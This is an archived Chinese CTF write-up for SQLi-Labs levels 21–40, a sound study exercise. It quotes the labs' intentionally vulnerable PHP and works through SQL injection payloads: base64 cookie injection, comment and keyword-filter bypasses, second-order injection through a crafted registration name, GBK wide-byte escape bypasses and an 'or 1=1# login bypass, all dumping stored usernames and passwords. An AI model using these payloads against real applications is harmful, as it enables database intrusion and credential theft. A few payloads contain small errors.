---
title: "SQLi-Labs 21\u201340: Filtering, Encoding and Second-Order Injection"
title_zh: "SQLi-Labs 21–40：过滤、编码与二次注入"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: Sql Lab(21-40)
date: 2019-01-20 20:05:00
slug: sql-lab(21-40)
permalink: writing/sql-lab(21-40)/
topic: CTF
summary: "Historical exercises on cookies, comment filters, character sets and changing input contexts."
summary_zh: "继续分析 Cookie 编码、注释过滤、二次注入与关键词处理，重点拆解宽字节环境下的转义边界，并记录不同输入上下文中的尝试、报错与绕过思路。"
format_label: CTF write-up
featured_rank: 0
missing_images: 17
withheld_images: 0
recovered_images: 0
tags: Sql Lab
---

## less-21

```php
function check_input($value)
 {
 if(!empty($value))
  {
  $value = substr($value,0,20); // truncation (see comments)
  }
  if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
   {
   $value = stripslashes($value);
   }
  if (!ctype_digit($value))    // Quote if not a number
   {
   $value = "'" . mysql_real_escape_string($value) . "'";
   }
 else
  {
  $value = intval($value);
  }
 return $value;
 }
 echo "<br>";
 echo "<br>";
 if(isset($_POST['uname']) && isset($_POST['passwd']))
  {
  $uname = check_input($_POST['uname']);
  $passwd = check_input($_POST['passwd']);
  $sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
  $result1 = mysql_query($sql);
  $row1 = mysql_fetch_array($result1);
   if($row1)
    {
    echo '<font color= "#FFFF00" font size = 3 >';
    setcookie('uname', base64_encode($row1['username']), time()+3600); 
    
    echo "I LOVE YOU COOKIES";
    echo "</font>";
    echo '<font color= "#0000ff" font size = 3 >';   
    //echo 'Your Cookie is: ' .$cookee;
    echo "</font>";
    echo "<br>";
    print_r(mysql_error());   
    echo "<br><br>";
    echo '<img src="../images/flag.jpg" />';
    echo "<br>";
    header ('Location: index.php');
    }
   else
    {
    echo '<font color= "#0000ff" font size="3">';
    //echo "Try again looser";
    print_r(mysql_error());
    echo "</br>";   
    echo "</br>";
    echo '<img src="../images/slap.jpg" />'; 
    echo "</font>";  
    }
   }
   echo "</font>";  
 echo '</font>';
 echo '</div>';
}
else
{
 if(!isset($_POST['submit']))
  {
   $cookee = $_COOKIE['uname'];
   $format = 'D d M Y - H:i:s';
   $timestamp = time() + 3600;
   echo "<center>";
   echo "<br><br><br><b>";
   echo '<img src="../images/Less-21.jpg" />';
   echo "<br><br><b>";
   echo '<br><font color= "red" font size="4">'; 
   echo "YOUR USER AGENT IS : ".$_SERVER['HTTP_USER_AGENT'];
   echo "</font><br>"; 
   echo '<font color= "cyan" font size="4">'; 
   echo "YOUR IP ADDRESS IS : ".$_SERVER['REMOTE_ADDR'];   
   echo "</font><br>";   
   echo '<font color= "#FFFF00" font size = 4 >';
   echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
   echo '<font color= "orange" font size = 5 >';   
   echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
   
   $cookee = base64_decode($cookee);
   echo "<br></font>";
   $sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
   $result=mysql_query($sql);
   if (!$result)
      {
      die('Issue with your mysql: ' . mysql_error());
      }
   $row = mysql_fetch_array($result);
   if($row)
    {
      echo '<font color= "pink" font size="5">'; 
      echo 'Your Login name:'. $row['username'];
      echo "<br>";
    echo '<font color= "grey" font size="5">';   
    echo 'Your Password:' .$row['password'];
      echo "</font></b>";
    echo "<br>";
    echo 'Your ID:' .$row['id'];
      }
   else 
    {
    echo "<center>";
    echo '<br><br><br>';
    echo '<img src="../images/slap1.jpg" />';
    echo "<br><br><b>";
    //echo '<img src="../images/Less-20.jpg" />';
    }
   echo '<center>';
   echo '<form action="" method="post">';
   echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
   echo '</form>';
   echo '</center>';
  } 
 else
  {
  echo '<center>';
  echo "<br>";
  echo "<br>";
  echo "<br>";
  echo "<br>";
  echo "<br>";
  echo "<br>";
  echo '<font color= "#FFFF00" font size = 6 >';
  echo " Your Cookie is deleted";
    setcookie('uname', base64_encode($row1['username']), time()-3600);
    header ('Location: index.php');
  echo '</font></center></br>';
  
  }  
```

通过查看源码，我们发现这道题不仅加了过滤（check_input），而且需要对cookie:uname进行base 64编码，这样才能匹配
测试：
![历史配图暂缺](redacted-image:missing)
```' union select 1,1,database() #```
```JyB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgIw==```
![历史配图暂缺](redacted-image:missing)
根据报错，源码中是括号中的单引号，故语句应改为
爆库
```') union select 1,1,database() #```
```JykgdW5pb24gc2VsZWN0IDEsMSxkYXRhYmFzZSgpICM=```
放入burp中，![历史配图暂缺](redacted-image:missing)
爆表
```') union select 1,1,group_concat(table_name) from information_schema.tables where table_schema='security' #```
```JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=```
![历史配图暂缺](redacted-image:missing)
爆列
```') union select 1,1,group_concat(column_name) from information_schema.columns where table_name='users' #```
```JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=```
![历史配图暂缺](redacted-image:missing)
爆值
```') union select 1,1,group_concat(username,password) from users#```
```JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMj```
![历史配图暂缺](redacted-image:missing)

## less-22

看了源码发现和less-21差不多，所以这里只需要根据报错提示修改注入语句即可
测试
![历史配图暂缺](redacted-image:missing)
在burp中输入以上发现报错
![历史配图暂缺](redacted-image:missing)
故只需将【")】改为【"】即可，重复less21的步骤。

## less-23

```php
if(isset($_GET['id']))
{
$id=$_GET['id'];

//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
@$row = mysql_fetch_array($result);

 if($row)
 {
   echo '<font color= "#0000ff">'; 
   echo 'Your Login name:'. $row['username'];
   echo "<br>";
   echo 'Your Password:' .$row['password'];
   echo "</font>";
   }
 else 
 {
 echo '<font color= "#FFFF00">';
 print_r(mysql_error());
 echo "</font>";  
 }
}
```

源码看似简单粗暴，但是它过滤了注释符，对我们接下来的操作造成短暂的不便，那怎么样才能绕过呢？这是一个关键的问题，我们用注释是为了达到闭合的效果，所以这里只需要改变一下查询语句的闭合位置。
测试：
输入?id=1' 报错
![历史配图暂缺](redacted-image:missing)
根据报错提示，发现注入参数是在一对单引号中。
注入语句：
```id=0'  union select 1,1,database() #```
不显示。
找闭合点：
?id=1' union select  '1
?id=1' union select  1 , '1
?id=1' union select  1 , 1 ,'1
发现前来个都会报错，而最后一个不报错，说明当前查询表的列数是三列。
爆库
```?id=0' union select 1,database(),'1```
爆表
```?id=0'%20 union%20 select%20 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'),'1```
爆列
```?id=0'%20 union%20 select%20 1, (select group_concat(column_name) from information_schema.columns where table_name='users'),'1```
爆值
```?id=0'%20 union%20 select%20 1, (select group_concat(username,password) from users),'1```

## less-24

利用带有管理员账号的注册用户名，在修改密码的时候达到修改管理员账号密码的效果即可
注册用户名：admin’ or ‘1’=’1  密码为 admin
注册成功后，登录进去修改密码，将密码改为 123
更改后即可发现，admin用户的密码也被改成了123，
```update tables set password=’123’ where username=’admin’ or ‘1’=’1’```

## less-25

过滤了or和and
故这里的and 用&&，anandd代替
or用||，oorr代替
注入id=1',报错，根据报错提示发现注入参数被一对单引号包裹
测试：
?id=0' union select 1,1,'1
测试成功。
爆库：
```?id=0' union select 1,database(),'3```
爆表：
```?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),'3```
![历史配图暂缺](redacted-image:missing)
发现爆错原来information中【or】被过滤了，只需把information改成infoorrmation即可
![历史配图暂缺](redacted-image:missing)
爆列：
```?id=0' union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),'3```
爆值：
```?id=0' union select 1,(select group_concat(username,password) from users,'3```

## less-26

![历史配图暂缺](redacted-image:missing)
简单试了一下，过滤了所有空白字符，看了一下源码，发现过滤的还不少，想要绕过,难度有点大，听说注释法很管用/**/或者%0a，但是试了一下都不行。。。

## less-27

看图标发现union,select，空格都被过滤了，所以想办法绕过：
1.双写，发现不行(unionunion selectselect)
2.大小写，测试通过(unIon%0ASelEcT%0A)
3.将以上两种结合，测试通过(UNionUNION%0ASeLectselect)
注入：
爆库：
```?id=0' UNionUNION%0ASeLectselect%0A1,database(),'1```
爆表：
```?id=0' UNionUNION%0ASeLectselect%0A1,(seLect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security'),'1```
爆值：
```?id=0'%0AUNionUNION%0ASeLectselect%0A1,(SeLectselect%0Agroup_concat(username,password)%0Afrom%0Ausers),'1```
![历史配图暂缺](redacted-image:missing)

## less-28

这关没有错误回显，所以只能试，
测试;
?id=1,注入成功。
?id=1',不显示。
?id=1",注入成功。
说明它不单单只有单引号这么简单，猜测它是?id=1') ,注入成功。
注入：
与前面思路一致，只需绕过union+select
爆库：
```?id=0')%0Aunionunion%0ASElect%0Aselect%0A1,database(),('1```

## less-29

这道题简单测试一下恢复正常，单引号注入，详细过程同上。

## less-30

简单的测试发现不报错，也不显示，测试后发现注入1或者1'则成功，说明很可能在一对双引号里
注入：
```?id=0" union select 1,1,database() --+```[源码过滤了#]

## less-31

输入?id=1"
![历史配图暂缺](redacted-image:missing)
根据报错提示，我们只需在【"】后添加【)】即可
注入:
稍作改动，同之前。

## less-32

发现注入1，1‘，1“，这些都对

```
function check_addslashes($string)
{ 
$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string); //escape any backslash 
$string = preg_replace('/\'/i', '\\\'', $string); //escape single quote with a backslash
 $string = preg_replace('/\"/', "\\\"", $string); //escape double quote with a backslash 
return $string; 
} 
$id=check_addslashes($_GET['id']);
 $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; $result=mysql_query($sql); 
$row = mysql_fetch_array($result);
 if($row)
{ 
echo 'Your Login name:'. $row['username']; 
echo 'Your Password:' .$row['password']; 
}else{
 print_r(mysql_error());
 }
```

### 这里说一下宽字节绕过，因为下面几道题都是

### 原理

>mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤’ 的时候，往往利用的思路是将’ 转换为\’ （转换的函数或者思路会在每一关遇到的时候介绍）。
>%df 吃掉 \ 具体的原因是 urlencode(\’) = %5c%27，我们在 %5c%27 前面添加 %df，形成 %df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此事 %df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。
>将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的 %5c 会被前面的 %5c 给注释掉。这也是bypass 的一种方法。

### 注入思路

>将’ 前面添加的\ 除掉，一般有两种思路：
>urlencode(\’) = %5c%27，我们在 %5c%27 前面添加 %df，形成 %df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此事 %df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。

所以根据以上不难判断出,payload:
```?id=0%df' union select 1,1,database() --+```

## less-33

同less-32
payload:```?id=0%df%27%20union%20select%201,1,1%20--+```

## less-34

### 原理

>本关是 post 型的注入漏洞，同样的也是将post 过来的内容进行了 ‘\’ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的 \ 给吃掉。而 get 型的方式我们是以 url 形式提交的，因此数据会通过URLencode，如何将方法用在 post 型的注入当中，我们此处介绍一个新的方法。
>将 utf-8 转换为 utf-16 或 utf-32，例如将 ’ 转为 utf-16 为 %EF%BF%BD% 。我们就可以利用这个方式进行尝试。
>POST型 这里使用万能账号

```sql
uname:'or 1=1#
password: 任意
```

## less-35

输入id=1',报错![历史配图暂缺](redacted-image:missing)
根据报错发现没用单引号,id 没有被 ’ 符号包括起来，那我们就没有必要去考虑check_addslashes() 函数的意义了
爆库:
```?id=0 union select 1,1,database() --+```
爆表：
```?id=0 union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+```
爆值:
```?id=0 union select 1,group_concat(username),group_concat(password) from security.users where 1 #```

## less-36

爆库：
```?id=0%df%27%20union%20select%201,1,database()--+```
爆表：
```?id=0%df%27%20union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()--+```
爆值：
```?id=0%df' union select 1,group_concat(username),group_concat(password) from security.users where 1 #```

## less-37

POST型 这里使用万能账号

```sql
uname:'or 1=1#
password: 任意
```

## less-38

爆库：
```?id=0' union select 1,1,database()--+```
爆表：
```?id=0' union select 1,1,group_concat(table_name) from information_schema.tables where table_schema='security' --+```

## less-39

爆库：
```?id=0 union select 1,1,database()--+```
同38只不过变为?id=0去掉单引号

## less40

注入1，1"都对，但是1‘不对，也不回显，故根据经验我猜测是')。
测试：
```?id=0') union select 1,1,1--+```![历史配图暂缺](redacted-image:missing)
爆库：
```?id=0') union select 1,1,1--+```![历史配图暂缺](redacted-image:missing)
同上只是id=0变为id=0')加上单引号和括号。

## 附有用

[sqli-labs宽字节注入题目深入学习](https://blog.csdn.net/Kevinhanser/article/details/81563451)
[Decoder - Encoder](https://encoder.mattiasgeniar.be/index.php)
[见到WAF不害怕，注入绕过](https://www.freebuf.com/articles/web/36683.html)
